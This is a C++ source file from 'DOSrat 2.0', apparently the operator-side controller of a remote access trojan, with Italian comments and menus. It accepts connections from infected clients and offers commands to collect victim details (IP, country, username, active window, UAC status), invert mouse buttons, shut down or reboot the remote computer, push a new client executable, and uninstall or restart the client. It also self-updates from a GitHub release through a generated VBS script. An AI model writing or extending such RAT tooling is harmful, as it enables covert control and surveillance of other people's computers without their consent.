#pragma once

void StampaTitolo(short Returns = 0)
{
    TextColor tc;
    tc.SetColor(tc.Green);

    cout << "  ______  _______ ______                      ______    _____  " << endl;
    cout << " (______)(_______) _____)              _     (_____ \\  (_____) " << endl;
    cout << "  _     _ _     ( (____   ____ _____ _| |_     ____) ) _  __ _ " << endl;
    cout << " | |   | | |   | \\____ \\ / ___|____ (_   _)   / ____/ | |/ /| |" << endl;
    cout << " | |__/ /| |___| |____) ) |   / ___ | | |_   | (_____ |   /_| |" << endl;
    cout << " |_____/  \\_____(______/|_|   \\_____|  \\__)  |_______|_)_____/ " << endl << endl;
    cout << "| Versione [" << Version << "]" << endl;
    cout << "| DOSrat 2.0 by Criper98" << endl;

    for (int i = 0; i < Returns; i++)
        cout << endl;

    tc.SetColor(tc.Default);
}

void StampaPrefix(string NomeClient = "")
{
    TextColor tc;

    tc.SetColor(tc.Yellow);

    cout << "DOSrat 2.0";

    if (NomeClient != "")
    {
        tc.SetColor(tc.Default);
        cout << " [";
        tc.SetColor(tc.Purple);
        cout << NomeClient;
        tc.SetColor(tc.Default);
        cout << "]";
    }

    tc.SetColor(tc.Default);
    cout << "> ";
}

bool AutoAggiornamento()
{
    GitHub gh;
    DirUtils du;
    SystemUtils su;

    du.SetCurrDir(du.GetModuleFilePath());

    if (!du.CheckDir("Update"))
        du.MakeDir("Update");

    if (!gh.DownloadFromRepoRelease("criper98", "dosrat-2.0", "DOSrat2.0.zip", "Update\\"))
        return false;

    su.NoOutputCMD("PowerShell Expand-Archive Update\\DOSrat2.0.zip 'Update' -force");

    du.DelFile("Update\\DOSrat2.0.zip");

    if(!du.WriteFile("Update.vbs", "WScript.Sleep 2500\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nSet WshShell = WScript.CreateObject(\"WScript.Shell\")\nfilesys.DeleteFile \"DOSrat 2.0.exe\"\nfilesys.DeleteFile \"Build\\Client.exe\"\nfilesys.MoveFile \"Update\\DOSrat 2.0.exe\", \"DOSrat 2.0.exe\"\nfilesys.MoveFile \"Update\\Build\\Client.exe\", \"Build\\Client.exe\"\nWshShell.Run \"DOSrat 2.0.exe\", 1, false\nfilesys.DeleteFile \"Update.vbs\""))
        return false;

    su.NoOutputCMD("start \"\" \"" + du.GetModuleFilePath() + "Update.vbs\"");

    return true;
}

void VerificaAggiornamenti(bool AutoUpdate)
{
    GitHub gh;
    EasyMSGB msgb;
    SystemUtils su;

    string CurrTag = gh.GetRepoTag("criper98", "dosrat-2.0");

    if (CurrTag != Version && CurrTag.find("-1 errore") == string::npos)
    {
        if (AutoUpdate)
        {
            if (AutoAggiornamento())
                exit(0);
        }
        else
        {
            if (msgb.YesNo("Aggiornamento trovato!\nVuoi andare alla pagina ora?", msgb.Info, "DOSrat 2.0"))
                su.OpenURL("https://github.com/Criper98/DOSrat-2.0/releases/latest");
        }
    }
}

void AccettaConnessioni(TcpIP& Server)
{
    int c = 0;

    while (true)
    {
        if (!ServerLoopController)
            break;

        for (int i = 0; i < MAX_CLIENTS; i++)
        {
            if (!Clients[i].IsConnected)
            {
                c = i;
                i = MAX_CLIENTS;
            }
        }

        if (Server.WaitConn(Clients[c].sock, 1000))
            COMUNICAZIONI::Inizializzazione(c, Clients[c].sock);
    }

    return;
}

void VerificaConnessioni()
{
    while (true)
    {
        if (!ServerLoopController)
            break;

        for (int i = 0; i < MAX_CLIENTS; i++)
        {
            if (!ServerLoopController)
                break;

            if (Clients[i].IsConnected && !Clients[i].InTask)
            {
                char garbage;
                TcpIP::SetTimeout(100, Clients[i].sock);

                int Res = recv(Clients[i].sock, &garbage, 1, MSG_PEEK);

                if (Res == SOCKET_ERROR || Res == 0)
                {
                    Res = WSAGetLastError();
                    //cout << "WSA " << Res << endl;

                    if (Res == 10054 || Res == 0)
                    {
                        closesocket(Clients[i].sock);
                        Clients[i].IsConnected = false;
                        Clu->AggiornaTitolo();
                    }
                }
                TcpIP::SetTimeout(0, Clients[i].sock);
            }
        }
    }

    return;
}

bool CheckConnection(SOCKET Sock, int ID)
{
    TextColor tc;

    if (TcpIP::SendString(Sock, "checkconn"))
    {
        tc.SetColor(tc.Yellow);
        cout << "Errore di connessione temporaneo, riprova." << endl;
        tc.SetColor(tc.Default);

        return true;
    }

    tc.SetColor(tc.Red);
    cout << "Impossibile raggiungere il Client." << endl;
    tc.SetColor(tc.Default);

    closesocket(Sock);
    Clients[ID].IsConnected = false;
    Clu->AggiornaTitolo();

    Sleep(2000);
    return false;
}

bool RestartServer(TcpIP &Server, int Port)
{
    ServerLoopController = false;

    Sleep(1000);

    for (int i = 0; i < MAX_CLIENTS; i++)
        if (Clients[i].IsConnected)
        {
            closesocket(Clients[i].sock);
            Clients[i].IsConnected = false;
        }

    Server.Stop();
    Server.Port = Port;
    if (Server.StartServer() != 0)
        return false;

    Sleep(1000);
    Clu->AggiornaTitolo();

    ServerLoopController = true;

    thread Aconn(AccettaConnessioni, ref(Server));
    thread Vconn(VerificaConnessioni);
    Aconn.detach();
    Vconn.detach();

    return true;
}

// ---------------[ COMANDI CLIENT ]---------------

bool GetInfo(SOCKET Sock, int ID)
{
    json j;
    CLInterface cli;
    VectString Header;
    VectString Body;

    Header.push_back("INFO");
    Header.push_back("VALORE");

    j = COMUNICAZIONI::GetInfo(Sock);

    if (j.dump() == "null")
        return false;

    Body.push_back("IP Wan");
    Body.push_back(Clients[ID].info.IP);

    Body.push_back("IP Lan");
    Body.push_back(j["IPL"]);

    Body.push_back("Nazione");
    Body.push_back(Clients[ID].info.Location.Country);

    Body.push_back("OS");
    Body.push_back(Clients[ID].info.OS);

    Body.push_back("UAC");
    Body.push_back(Clients[ID].info.UAC);

    Body.push_back("Percorso");
    Body.push_back(Clients[ID].info.InstallPath);

    Body.push_back("Versione");
    Body.push_back(Clients[ID].info.Versione);

    Body.push_back("Nome PC");
    Body.push_back(Clients[ID].info.PCname);

    Body.push_back("Nome Utente");
    Body.push_back(Clients[ID].info.UserName);

    Body.push_back("CPU %");
    Body.push_back(j["CPU"]);

    Body.push_back("RAM %");
    Body.push_back(j["RAM"]);

    Body.push_back("Finestra Attiva");
    Body.push_back(j["ACTWIN"]);

    Body.push_back("Data Installazione");
    Body.push_back(j["INSTDATE"]);

    cout << "Informazioni ricevute:" << endl;
    cli.Table(Header, Body);

    return true;
}

bool InvertMouse(SOCKET Sock, int ID)
{
    string Status;

    Status = COMUNICAZIONI::InvertMouse(Sock);

    if (Status == "a")
        cout << "Tasti invertiti." << endl;
    else if (Status == "b")
        cout << "Tasti normali." << endl;
    else
        return false;

    return true;
}

bool Reconnect(SOCKET Sock, int ID)
{
    if (COMUNICAZIONI::Reconnect(Sock))
    {
        closesocket(Sock);
        Clients[ID].IsConnected = false;
        Clu->AggiornaTitolo();
        return true;
    }

    return false;
}

bool KillClient(SOCKET Sock, int ID)
{
    if (COMUNICAZIONI::KillClient(Sock))
    {
        Sleep(1000);
        closesocket(Sock);
        Clients[ID].IsConnected = false;
        Clu->AggiornaTitolo();
        return true;
    }

    return false;
}

bool Shutdown(SOCKET Sock, int ID)
{
    if (COMUNICAZIONI::Shutdown(Sock))
    {
        Sleep(1000);
        closesocket(Sock);
        Clients[ID].IsConnected = false;
        Clu->AggiornaTitolo();
        return true;
    }

    return false;
}

bool Reboot(SOCKET Sock, int ID)
{
    if (COMUNICAZIONI::Reboot(Sock))
    {
        Sleep(1000);
        closesocket(Sock);
        Clients[ID].IsConnected = false;
        Clu->AggiornaTitolo();
        return true;
    }

    return false;
}

short UpdateClient(SOCKET Sock, int ID)
{
    DirUtils du;

    string FilePath = du.ChoseFileDialog("Client\0*.exe\0", du.GetModuleFilePath().c_str());

    if (FilePath == "")
        return 1;

    cout << "Invio file in corso..." << endl;
    if (COMUNICAZIONI::UpdateClient(Sock, du.GetBinaryFileContent(FilePath)))
    {
        cout << "File inviato." << endl;
        Sleep(1000);
        closesocket(Sock);
        Clients[ID].IsConnected = false;
        Clu->AggiornaTitolo();
        return 0;
    }

    return -1;
}

bool Uninstall(SOCKET Sock, int ID)
{
    if (COMUNICAZIONI::Uninstall(Sock))
    {
        Sleep(1000);
        closesocket(Sock);
        Clients[ID].IsConnected = false;
        Clu->AggiornaTitolo();
        return true;
    }

    return false;
}

bool RestartClient(SOCKET Sock, int ID)
{
    if (COMUNICAZIONI::RestartClient(Sock))
    {
        Sleep(1000);
        closesocket(Sock);
        Clients[ID].IsConnected = false;
        Clu->AggiornaTitolo();
        return true;
    }

    return false;
}

void Sessione(int ID, SOCKET Sock)
{
    CLInterface cli;
    TextColor tc;

    string cmd;

    system("cls");
    StampaTitolo(1);
    cli.SubTitle("Sessione Comandi", 60, tc.Green);

    for (bool Controllo = true; Controllo;)
    {
        StampaPrefix(Clients[ID].info.UserName);
        getline(cin, cmd);
        cmd = ToLowerCase(cmd);

        Clients[ID].InTask = true;

        if (cmd == "help")
        {
            cout << "\t\tClient" << endl;
            cout << "Reconnect - Forza il Client a scollegarsi e ricollegarsi a DOSrat ma senza riavviarlo." << endl;
            cout << "Killclient / Kill - Termina il processo del Client." << endl;
            cout << "Updateclient / Update - Aggiorna il Client scegliendo l'eseguibile tra i file locali, il Client si riavviera' con il file scelto." << endl;
            cout << "Uninstall - Disinstalla il Client dal computer remoto." << endl;
            cout << "Restartclient / Restart - Riavvia il Client terminando il processo e riavviandolo." << endl;
            cout << endl;
            cout << "\t\tSystem" << endl;
            cout << "Getinfo - Ottieni informazioni sul computer remoto e sul Client." << endl;
            cout << "Invertmouse - Inverte i tasti del mouse sul computer remoto." << endl;
            cout << "Shutdown - Spegne il computer remoto." << endl;
            cout << "Reboot - Riavvia il computer remoto." << endl;
            cout << endl;
            cout << "\t\tUtility" << endl;
            cout << "Exit / Close - Torna al menu principale." << endl;
            cout << "Clear / Cls - Pulisce la console da tutti i comandi precedenti." << endl;
            cout << "Help - Mostra la lista dei comandi." << endl;
            cout << endl;
        }
        else if (cmd == "getinfo")
        {
            if (!GetInfo(Sock, ID))
                Controllo = CheckConnection(Sock, ID);
        }
        else if (cmd == "invertmouse")
        {
            if (!InvertMouse(Sock, ID))
                Controllo = CheckConnection(Sock, ID);
        }
        else if (cmd == "exit" || cmd == "close")
        {
            Controllo = false;
        }
        else if (cmd == "reconnect")
        {
            if (!Reconnect(Sock, ID))
                Controllo = CheckConnection(Sock, ID);
            else
                Controllo = false;
        }
        else if (cmd == "clear" || cmd == "cls")
        {
            system("cls");
            StampaTitolo(1);
            cli.SubTitle("Sessione Comandi", 60, tc.Green);
        }
        else if (cmd == "killclient" || cmd == "kill")
        {
            if (!KillClient(Sock, ID))
                Controllo = CheckConnection(Sock, ID);
            else
                Controllo = false;
        }
        else if (cmd == "shutdown")
        {
            if (!Shutdown(Sock, ID))
                Controllo = CheckConnection(Sock, ID);
            else
                Controllo = false;
        }
        else if (cmd == "reboot")
        {
            if (!Reboot(Sock, ID))
                Controllo = CheckConnection(Sock, ID);
            else
                Controllo = false;
        }
        else if (cmd == "updateclient" || cmd == "update")
        {
            switch (UpdateClient(Sock, ID))
            {
                case -1: Controllo = CheckConnection(Sock, ID); break;
                case 0: Controllo = false; break;
                case 1: break;
            }
        }
        else if (cmd == "uninstall")
        {
            if (!Uninstall(Sock, ID))
                Controllo = CheckConnection(Sock, ID);
            else
                Controllo = false;
        }
        else if (cmd == "restartclient" || cmd == "restart")
        {
            if (!RestartClient(Sock, ID))
                Controllo = CheckConnection(Sock, ID);
            else
                Controllo = false;
        }
        else
        {
            cout << "\"" << cmd << "\" non e' un comando valido, usa \"help\" per la lista di tutti i comandi." << endl;
        }

        Clients[ID].InTask = false;
    }
}